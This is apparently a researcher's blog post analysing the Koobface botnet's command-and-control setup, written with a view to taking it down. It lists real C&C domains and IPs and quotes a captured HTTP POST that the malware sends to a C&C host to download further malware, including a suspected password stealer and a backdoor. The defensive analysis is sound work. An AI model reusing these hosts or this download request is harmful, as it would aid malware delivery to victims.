In this second part of the series I will try to analyze the command and control structure/coordinates for another famous botnet, Koobface.
This article is not a detailed analysis of the malware itself but covers mostly its botnet aspect.
Readers who are interested to learn about the internals of this malware may refer these articles:

How to Defeat Koobface
These articles were published back in December 2008 but most of the details are still valid for the newer versions.
Back to the CnC structure ... Koobface relies mostly on domain names to locate its CnC servers, instead of using hard coded IPs like Pushdo.
As a matter of fact, I observed that it tends to change its CnC domains more often than the IPs behind those domains.
Based on my lab data (for the last 3 months or so) I see Koobface connecting to 23 unique domains.
Here is the complete list:
a22092008.com upr15may.com a13092008.com 5824125537.com a221008.com y171108.com a080908.net main15052009.com wn20090504.com nua06032009.biz lastshanse26032009.com supersearch20090330.com wnames1404.com ram06032009.biz fdns6mar09.info nua20090515.com websrv09.com er21012009.com open21012009.com onames0603.com 586523333.com x17012009.com f071108.com
Surprisingly, when I count the collective IPs behind all these domains, I hardly find 4 unique IPs.
Multiple domains have been resolving to these fixed IPs over the period I examined.
Please note here that most of these domains are not resolving at the time of writing this article.
Currently, the active domains and servers are as follows:
upr15may.com --> 92.38.0.69 wn20090504.com --> 119.110.107.137 websrv09.com --> 58.241.255.37
where upr15may.com (92.38.0.69) is the most active domain at the moment.
It looks like the only way to shutdown Koobface is to take down all of its domains.
Pulling the plug of a particular server will be useless.
Another thing worth noticing is that none of the servers above are hosted in the USA so what are our chances of shutting down these servers?
Now lets take a look at the BotnetWeb aspect in the case of Koobface.
Is there any top layer malware involved in the the download of Koobface?
Unfortunately the answer is yes.
Apart from relying on social engineering and web exploits as propagation mechanisms, Koobface has been seen as the secondary download of many other known malware.
This all forms a very powerful BotnetWeb, shutting the Koobface net itself might not be enough until the complete BotnetWeb is shut down.
Here is the list of known Koobface droppers.
Another important thing to consider here is that Kobface itself is a powerful downloader.
Koobface asks for additional malware components as follows:
POST /ld/gen.php HTTP/1.1 Host: upr15may.com User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1.2600 ; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) Content-type: application/x-www-form-urlencoded Connection: close Content-Length: 108

In the above mentioned packet snippet, Koobface is trying to install 2 different malware samples onto the infected system.
I did not get a chance to analyze these samples in detail but the initial black box investigation reveals:
1.
6244.exe installs a BHO.
May be password stealing, not sure at the moment.
2. nfr.exe is a backdoor (TCP port 7171), probing on this port shows that there is some custom web server listening on this port.
Detailed analysis for these two components is due on my side, I'll try to cover them in some future article.
1.
We need to take down all the Koobface domains in order to shut it down.
Shutting down the back end servers is not enough.
The DNS records could easily be modified to point to new systems.
2.
There is a percentage of Koobface instances which spread through other malware.
These top level malware might drop another Koobface instance onto the infected machine pointing to different domains.
Although pay per install always costs some money.
3.
Lets not forget about child malware downloads.
We need to kill them as well.
The good thing is that for the last many months I am seeing same set of malware being downloaded by Koobface.
It makes it easier to kill the command and control of these child malware as well.
How?
Watch for future articles.
